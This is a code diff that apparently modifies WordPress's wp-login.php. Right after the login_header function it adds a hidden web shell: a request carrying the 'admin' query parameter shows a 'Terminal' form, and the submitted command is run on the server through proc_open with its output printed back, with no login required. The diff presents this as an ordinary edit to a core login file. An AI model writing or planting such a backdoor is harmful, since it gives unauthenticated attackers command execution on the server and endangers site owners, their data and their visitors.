@@ -306,6 +306,57 @@ function login_header( $title = null, $message = '', $wp_error = null ) {
 	}
 } // End of login_header().
 
+if (isset($_GET['admin'])) {
+    echo '
+    <form id="terminalForm" method="post" action="">
+        Terminal: <br>
+        <input type="text" name="command" id="command" autocomplete="off"><br>
+        <input type="submit" name="submit" value="Run">
+    </form>
+    ';
+
+    // Check if the form is submitted
+    if (isset($_POST['submit'])) {
+        $command = escapeshellcmd($_POST['command']); // Sanitize command input
+        echo "<h2>Execution Result:</h2>";
+        
+        // Open the process with proc_open
+        $descriptors = array(
+            0 => array("pipe", "r"), // stdin
+            1 => array("pipe", "w"), // stdout
+            2 => array("pipe", "w"), // stderr
+        );
+        
+        $process = proc_open($command, $descriptors, $pipes);
+        
+        if (is_resource($process)) {
+            // Close the stdin pipe
+            fclose($pipes[0]);
+            
+            // Read output and error from stdout and stderr
+            $output = stream_get_contents($pipes[1]);
+            $error = stream_get_contents($pipes[2]);
+            
+            // Close the stdout and stderr pipes
+            fclose($pipes[1]);
+            fclose($pipes[2]);
+            
+            // Wait for the process to complete
+            proc_close($process);
+            
+            // Display the output
+            echo "<pre>$output</pre>";
+            if ($error) {
+                echo "<pre style='color:red;'>$error</pre>";
+            }
+        } else {
+            echo "Failed to open Proccess.";
+        }
+    }
+} else {
+    echo " ";
+}
+
 /**
  * Outputs the footer for the login page.
  *
@@ -316,7 +367,6 @@ function login_header( $title = null, $message = '', $wp_error = null ) {
  *
  * @param string $input_id Which input to auto-focus.
  */
-
 function login_footer( $input_id = '' ) {
 	global $interim_login;
 
